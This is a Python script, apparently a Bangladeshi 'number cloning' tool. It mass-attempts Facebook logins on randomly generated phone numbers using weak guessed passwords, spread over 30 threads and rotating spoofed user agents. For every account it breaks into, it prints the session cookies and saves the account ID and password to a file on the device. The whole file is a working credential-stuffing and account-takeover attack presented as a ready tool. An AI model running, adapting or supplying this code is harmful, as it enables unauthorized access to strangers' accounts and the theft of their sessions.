from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import os
import random
import requests,bs4,json,sys,random,datetime,time,re,subprocess,platform,struct
from bs4 import BeautifulSoup as sop
from concurrent.futures import ThreadPoolExecutor as tred
import base64
import os,sys,time,json,random,re,string,platform,base64
import requests
from concurrent.futures import ThreadPoolExecutor as ThreadPool
import mechanize
from requests.exceptions import ConnectionError
import string
try:
    import requests
except ImportError:
    print('\n [✓] installing requests !...\n')
    os.system('pip install requests')

try:
    import concurrent.futures
except ImportError:
    print('\n [✓] installing futures !...\n')
    os.system('pip install futures')
try:
    import bs4
except ImportError:
    print('\n [✓] installing bs4 !...\n')
    os.system('pip install bs4')
    os.system('git pull')
    os.system('pkg install curl')
import requests, os, re, bs4,platform, sys, json, time, random, datetime, subprocess, threading, itertools,base64,uuid,zlib
from concurrent.futures import ThreadPoolExecutor as ahmadAXI
from datetime import datetime
from bs4 import BeautifulSoup


ct = datetime.now()
n = ct.month
bulan = ['January', 'February', 'March', 'April', 'May', 'June', 'July', 'Agustus', 'September', 'October', 'November', 'December']
try:
    if n < 0 or n > 12:
        exit()
    nTemp = n - 1
except ValueError:
    exit()

current = datetime.now()
ta = current.year
bu = current.month
ha = current.day
op = bulan[nTemp]
R = '\033[31;1m'
G = '\033[32;1m'
Y = '\033[33;1m'
B = '\033[34;1m'
M = '\033[35;1m'
C = '\033[36;1m'
LR = '\033[91;1m'
LG = '\033[92;1m'
LY = '\033[93;1m'
LB = '\033[94;1m'
LM = '\033[95;1m'
LC = '\033[96;1m'
dc = random.choice([R,G,Y,B,M,C,LR,LG,LY,LB,LM])
data,data2={},{}
aman,cp,salah=0,0,0
ubahP,fuck,pwBaru=[],[],[]
ok = []
id = []
user = []
loop = 0
oks = []
loop = 0
url_lookup = "https://lookup-id.com/"
url_mb = "https://m.facebook.com"
url_ip = "https://www.httpbin.org/ip"
header_grup = {"user-agent": "Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1 [FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"}
bulan_ttl = {"01": "January", "02": "February", "03": "March", "04": "April", "05": "May", "06": "June", "07": "July", "08": "Augustus", "09": "September", "10": "October", "11": "November", "12": "December"}
done = False

#agent
ugen=[]

for xd in range(10000):
    a='Mozilla/5.0 (Symbian/3; Series60/'
    b=random.randrange(1, 9)
    c=random.randrange(1, 9)
    d='Nokia'
    e=random.randrange(100, 9999)
    f='/110.021.0028; Profile/MIDP-2.1 Configuration/CLDC-1.1 ) AppleWebKit/535.1 (KHTML, like Gecko) NokiaBrowser/'
    g=random.randrange(1, 9)
    h=random.randrange(1, 4)
    i=random.randrange(1, 4)
    j=random.randrange(1, 4)
    k='Mobile Safari/535.1'
    uaku2=(f'{a}{b}.{c} {d}{e}{f}{g}.{h}.{i}.{j} {k}')
    ugen.append(uaku2)


    aa='Mozilla/5.0 (Linux; U; Android'
    b=random.choice(['6','7','8','9','10','11','12'])
    c=' en-us; GT-'
    d=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    e=random.randrange(1, 999)
    f=random.choice(['A','B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z'])
    g='AppleWebKit/537.36 (KHTML, like Gecko) Chrome/'
    h=random.randrange(73,100)
    i='0'
    j=random.randrange(4200,4900)
    k=random.randrange(40,150)
    l='Mobile Safari/537.36'
    uaku2=f'{aa} {b}; {c}{d}{e}{f}) {g}{h}.{i}.{j}.{k} {l}'
    ugen.append(uaku2)

def jalan(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)

def Psycho():
    os.system('clear')
    jalan(logo)
    print('\033[1;95m─────────────────────────────────────────────────────')
    jalan('\033[1;92m[\033[1;91m1\033[1;92m]\033[1;95m START NUMBER CLONING ')
    jalan('\033[1;92m[\033[1;91m2\033[1;92m]\033[1;95m CONTACT ME FACEBOOK')
    jalan('\033[1;92m[\033[1;91m3\033[1;92m]\033[1;95m FOLLOW GITHUB ACCOUNT')
    jalan('\033[1;92m[\033[1;91m4\033[1;92m]\033[1;95m FOLLOW PAGE')
    jalan('\033[1;92m[\033[1;91m0\033[1;92m]\033[1;91m EXIT PROGRAM')
    Picchi = input('\n\x1b[1;32mCHOOSE : ')
    if Picchi == '1':
        psycho()
    if Picchi == '3':
        os.system('xdg-open https://github.com/VENOM-ARIFIN')
        Psycho()
    if Picchi == '4':
        os.system('xdg-open https://www.facebook.com/iam.arifinrashid')
        Psycho()
    if Picchi == '1':
        os.system('xdg-open https://www.facebook.com/iam.arifinrashid')
        Psycho()
    if Picchi == '0': 
        os.system('exit')
        return None

logo = ("""
____        _    ____  ___ _____ ___ _   _
   / \  |  _ \|_ _|  ___|_ _| \ | |
  / _ \ | |_) || || |_   | ||  \| |
 / ___ \|  _ < | ||  _|  | || |\  |
/_/   \_|_| \_|___|_|   |___|_| \_|

\033[1;95m─────────────────────────────────────────────────────
\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;95m AUTHOR  \033[1;94m : \033[1;92mARIFIN-96
\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;95m FACEBOOK\033[1;94m : \033[1;92mfb.com/iam.arifinrashid
\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;95m GITHUB  \033[1;94m : \033[1;92mVENOM-ARIFIN
\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;95m TOOLS   \033[1;94m : \033[1;92mBD NUMBER CLONING 
\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;95m VERSION \033[1;94m : \033[1;90m1.01
\033[1;95m─────────────────────────────────────────────────────""")
    
try:
    os.system('clear')
    nam = int(input('\n\033[1;92mFIRST FOLLOW ME ON GITHUB :\033[1;96m '))
    v = 5.2
    update = ('5.2')
    update = ('5.2')
    if str(v) in update:
        os.system('clear')
    else:pass
except:os.system('xdg-open https://github.com/VENOM-ARIFIN')
# APK CHECK
def psycho():
    user=[]
    twf =[]
    os.getuid
    os.geteuid
    os.system("clear")
    jalan(logo)
    jalan('\033[1;95m─────────────────────────────────────────────────────')
    jalan('\033[1;30mBANGLADESH CODE - \033[1;32m016 \033[1;32m017 \033[1;32m013 \033[1;32m018 \033[1;32m019 \033[1;32m014 \033[1;32m015')
    jalan('\033[1;95m─────────────────────────────────────────────────────\n')
    code = input('\033[1;92mCHOOSE BD CODE : ')
    print("")
    os.system('clear')
    print(logo)
    limit = int(input('\033[1;93mEXAMPLE : \033[1;92m2000, 5000, 10000, 50000\n\n\033[1;91mCHOOSE CLONING LIMIT : '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        user.append(nmp)
    with ThreadPool(max_workers=30) as manshera:
        os.system("clear")
        jalan(logo)
        tl = str(len(user))
        IP = requests.get('https://api.ipify.org').text
        print('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;95m YOUR IP ADDRESS : \033[1;92m'+IP)
        print('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;95m CHOOSE YOUR CODE : \033[1;92m' +code)
        print('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;95m TOTAL IDS : \033[1;92m'+tl)
        print('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;90m THE PROCESS HAS BEEN STARTED')
        print('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;91m TO STOP PROCESS Ctrl + Z')
        print('\033[1;95m─────────────────────────────────────────────────────')
        for love in user:
            pwx = [love, 'Bangladesh','bangladesh']
            uid = code+love
            manshera.submit(rcrack,uid,pwx,tl)
    jalan('\n\n\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;92m TOTAL OK : ' + str(len(oks)))
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;93m CHECK- /sdcard/PSYCHO-OK.txt')
    jalan('\033[1;92m[\033[1;91m✔︎\033[1;92m]\033[1;90m PROCESS HAS BEEN COMPLETE')
    os.system('exit')
def rcrack(uid,pwx,tl):
    #print(user)
    global loop
    global oks
    global proxy
    try:
        for ps in pwx:
            session = requests.Session()
            pro = random.choice(ugen)
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":uid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {"authority": 'web.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            "accept": 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,*/*;q=0.8,application/signed-exchange:v=b3;q=0.9',
            "accept-encoding": 'gzip, deflate, br',
            "accept-language": 'en-US,en;q=1',
            'cache-control': 'no-cache, no-store, must-revalidate',
            "referer": 'https://www.facebook.com/',
            "sec-ch-ua": '"Google Chrome";v="90", "Not)A;Brand";v="8", "Chromium";v="75"',
            "sec-ch-ua-mobile": '?0',
            "sec-ch-ua-platform": "Linux",
            "sec-fetch-dest": 'document',
            "sec-fetch-mode": 'navigate',
            "sec-fetch-site": 'same-origin',
            "sec-fetch-user": '?1',
            "pragma": 'no-cache',
            "priority": 'u=1',
            'cross-origin-resource-policy': 'cross-origin',
            "upgrade-insecure-requests": '1',
            "user-agent": pro}
            lo = session.post('https://web.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[151:166]
                print('\33[1;92m[PSYCHO-OK] '+uid+' | '+ps+' \n\033[1;35mCOOKIES : \033[1;32m'+coki+   '  ')
                cek_apk(session,coki)
                open('/sdcard/PSYCHO-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            else:
                continue
        loop+=1
        dc = random.choice([R,G,Y,B,M,C,LR,LG,LY,LB,LM])
        sys.stdout.write('\r%s[PICCHI-CRACK] \033[1;93m[%s/%s] \033[1;92m[OK-%s] \r'%(dc,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass

if __name__=='__main__':
	try:os.mkdir('OK')
	except:pass
	Psycho()
